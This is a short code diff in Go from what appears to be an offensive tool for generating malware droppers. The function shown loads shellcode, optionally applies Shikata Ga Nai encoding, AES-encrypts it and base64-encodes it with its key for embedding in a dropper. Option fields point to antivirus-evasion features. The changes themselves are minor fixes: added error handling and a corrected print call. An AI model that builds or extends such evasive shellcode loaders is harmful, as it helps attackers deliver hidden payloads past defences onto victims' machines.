@@ -86,8 +86,8 @@ func newDropper(goDrop Dropper, dropname, domain, input, output string, sgn bool
 		goDrop.MemCom = ""
 		dropname = strings.ReplaceAll(dropname, "hunter2", "")
 	} else {
-		goDrop.LeetImp = " "
-		goDrop.BlockNonMs = " "
+		goDrop.LeetImp = ""
+		goDrop.BlockNonMs = ""
 		goDrop.MemCom = MemCom
 
 	}
@@ -107,7 +107,7 @@ func newDropper(goDrop Dropper, dropname, domain, input, output string, sgn bool
 	} else {
 		shellcode = GetShellcode(input)
 	}
-	fmt.Printf(dropname)
+	fmt.Println(dropname)
 
 	if sgn {
 		color.Yellow("Shikata Ga Nai encoding shellcode.")
@@ -115,7 +115,10 @@ func newDropper(goDrop Dropper, dropname, domain, input, output string, sgn bool
 	}
 
 	//Format Shellcode for dropper.
-	shellcode.AESEncrypt()
+	_, err := shellcode.AESEncrypt()
+	if err != nil {
+		log.Fatalf("Error Encrypting shellcode:\n%v\n", err)
+	}
 	goDrop.BufStr = shellcode.ToB64()
 	goDrop.KeyStr = shellcode.KeyB64()
 	scFilepath := filepath.Join(output, dropname+"_encryptedB64.txt")
